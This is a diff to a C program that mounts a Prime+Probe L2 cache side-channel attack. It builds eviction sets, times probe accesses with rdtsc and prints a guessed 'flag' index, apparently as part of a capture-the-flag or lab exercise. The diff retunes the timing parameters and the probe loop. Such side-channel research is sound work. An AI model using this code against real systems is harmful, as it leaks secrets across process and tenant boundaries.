@@ -6,8 +6,8 @@
 
 #define NUM_L2_CACHE_SETS 1024
 #define WAYS 8
-#define REPEATS 15000
-#define THRESHOLD 350
+#define REPEATS 10000
+#define THRESHOLD 220
 
 // Read timestamp counter
 static inline uint64_t rdtsc() {
@@ -35,7 +35,6 @@ char* get_buffer() {
 
 // Build eviction set for one cache set
 void get_partial_eviction_set(char *buf, char *eviction_set[WAYS], int set_index) {
-
     for (int i = 0; i < WAYS; i++) {
         eviction_set[i] = buf + (i << 15) + (set_index << 6);
     }
@@ -55,54 +54,54 @@ int main() {
 
     while (1) {
 
-    uint64_t scores[NUM_L2_CACHE_SETS] = {0};
+        uint64_t scores[NUM_L2_CACHE_SETS] = {0};
 
-    for (int r = 0; r < REPEATS; r++) {
+        for (int r = 0; r < REPEATS; r++) {
 
-        // PRIME all sets
-        for (int set = 0; set < NUM_L2_CACHE_SETS; set++) {
-            for (int j = 0; j < WAYS; j++) {
-                tmp = *(eviction_sets[set][j]);
+            // PRIME
+            for (int set = 0; set < NUM_L2_CACHE_SETS; set++) {
+                for (int j = 0; j < WAYS; j++) {
+                    tmp = *(eviction_sets[set][j]);
+                }
+            }
+
+            asm volatile("mfence; lfence");
+
+            // Give victim time
+            usleep(500);
+
+            // PROBE
+            for (int set = 0; set < NUM_L2_CACHE_SETS; set++) {
+
+                uint64_t start = rdtsc();
+
+                for (int j = 0; j < WAYS; j++) {
+                    tmp = *(eviction_sets[set][j]);
+                }
+
+                uint64_t end = rdtsc();
+
+                scores[set] += (end - start);
             }
         }
 
-        asm volatile("mfence; lfence");
+        int guessed_flag = -1;
+        uint64_t max_score = 0;
 
-        // give victim time to run
-        for (volatile int d = 0; d < 300000; d++);
+        for (int i = 0; i < NUM_L2_CACHE_SETS; i++) {
 
-        // PROBE all sets
-        for (int set = 0; set < NUM_L2_CACHE_SETS; set++) {
+            uint64_t avg = scores[i] / REPEATS;
 
-            uint64_t start = rdtsc();
-
-            tmp = *(eviction_sets[set][0]);
-
-            uint64_t end = rdtsc();
-
-            scores[set] += (end - start);
+            if (avg > max_score) {
+                max_score = avg;
+                guessed_flag = i;
+            }
         }
-    }
 
-    int guessed_flag = -1;
-    uint64_t max_score = 0;
-
-    for (int i = 0; i < NUM_L2_CACHE_SETS; i++) {
-
-        uint64_t avg = scores[i] / REPEATS;
-
-        if (avg > max_score) {
-            max_score = avg;
-            guessed_flag = i;
-        }
-    }
-
-    if (max_score > THRESHOLD) {
         printf("Guessed flag: %d (latency=%lu)\n", guessed_flag, max_score);
         fflush(stdout);
-    }
 
-    usleep(300000);
+        usleep(300000);
     }
 
     return 0;
